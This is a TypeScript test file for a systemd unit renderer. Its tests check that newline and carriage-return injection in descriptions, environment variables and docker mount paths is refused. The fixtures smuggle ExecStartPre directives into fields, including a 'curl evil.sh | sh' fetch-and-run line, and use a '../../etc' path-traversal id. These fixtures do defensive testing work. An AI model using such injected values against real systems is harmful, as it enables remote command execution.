import { describe, expect, test } from 'bun:test'
import { containerExecStart, renderUnits } from './systemd'

// Ticket 67, finding F-10.
//
// A systemd unit file is newline-delimited `Key=Value`. Every value rendered
// into one is therefore an injection sink: a single `\n` in a description, an
// environment value, or a mount path ends the current directive and starts a
// new one — and `ExecStartPre=` is a directive. The unit then runs whatever the
// injected line says, as the user, on a timer, on a remote host.
//
// This is not theoretical reachability: a schedule's description and env come
// from the schedule record, which agents create.

const OPTS = { bun: '/usr/bin/bun', runner: '/opt/terminal-cron' }
const SPEC = { kind: 'calendar', minute: 0, hour: 3 } as const

describe('renderUnits refuses newline injection (ticket 67 F-10)', () => {
  test('a newline in the description cannot add a directive', () => {
    expect(() =>
      renderUnits('job1', SPEC, {
        ...OPTS,
        description: 'nightly\nExecStartPre=/bin/sh -c "curl evil.sh | sh"',
      }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('a carriage return is rejected too', () => {
    // systemd treats a bare \r as a line terminator in practice; allowing it
    // while blocking \n is the classic half-fix.
    expect(() =>
      renderUnits('job1', SPEC, { ...OPTS, description: 'a\rExecStartPre=/bin/sh' }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('a newline in an environment VALUE cannot add a directive', () => {
    expect(() =>
      renderUnits('job1', SPEC, {
        ...OPTS,
        env: { TOKEN: 'x\nExecStartPre=/bin/sh -c "id > /tmp/pwned"' },
      }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('a newline in an environment KEY cannot either', () => {
    expect(() =>
      renderUnits('job1', SPEC, { ...OPTS, env: { 'A\nExecStartPre': '/bin/sh' } }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('ordinary descriptions and env still render', () => {
    const { service, timer } = renderUnits('job1', SPEC, {
      ...OPTS,
      description: 'Nightly docs sweep — repo: my-project',
      env: { TERMINAL_CONFIG_DIR: '/home/u/.config/TerMinal', PATH: '/usr/bin:/bin' },
    })
    expect(service).toContain('Description=Nightly docs sweep — repo: my-project')
    expect(service).toContain('Environment=PATH=/usr/bin:/bin')
    expect(timer).toContain('OnCalendar=')
    // Exactly one ExecStart — the property the injection tests are protecting.
    expect(service.match(/^ExecStart/gm)?.length).toBe(1)
    expect(service.match(/^ExecStartPre/gm) ?? []).toEqual([])
  })
})

describe('containerExecStart quotes and validates mount paths (ticket 67 F-10)', () => {
  const base = {
    cfgDir: '/home/u/.config/TerMinal',
    repoRoot: '/home/u/src/proj',
    home: '/home/u',
    image: 'terminal-agent:latest',
  }

  test('an ordinary path set renders one docker run line', () => {
    const cmd = containerExecStart('job1', base)
    expect(cmd).toContain('docker run --rm')
    expect(cmd.includes('\n')).toBe(false)
  })

  test('a path containing a space does not split into extra docker args', () => {
    // Unquoted, `-v /home/u/My Repo:/home/u/My Repo` becomes three arguments and
    // docker mounts something nobody asked for.
    const cmd = containerExecStart('job1', { ...base, repoRoot: '/home/u/My Repo' })
    expect(cmd).toMatch(/-v ['"]\/home\/u\/My Repo/)
  })

  test('a newline in a mount path is refused outright', () => {
    expect(() =>
      containerExecStart('job1', { ...base, repoRoot: '/home/u/x\nExecStartPre=/bin/sh' }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('a newline in a read-only cred dir is refused too', () => {
    expect(() =>
      containerExecStart('job1', { ...base, credDirs: ['/home/u/.ssh\nExecStartPre=/bin/sh'] }),
    ).toThrow(/newline|invalid|unsafe/i)
  })

  test('the existing unit-id guard still holds', () => {
    expect(() => containerExecStart('../../etc', base)).toThrow(/unsafe/i)
  })
})
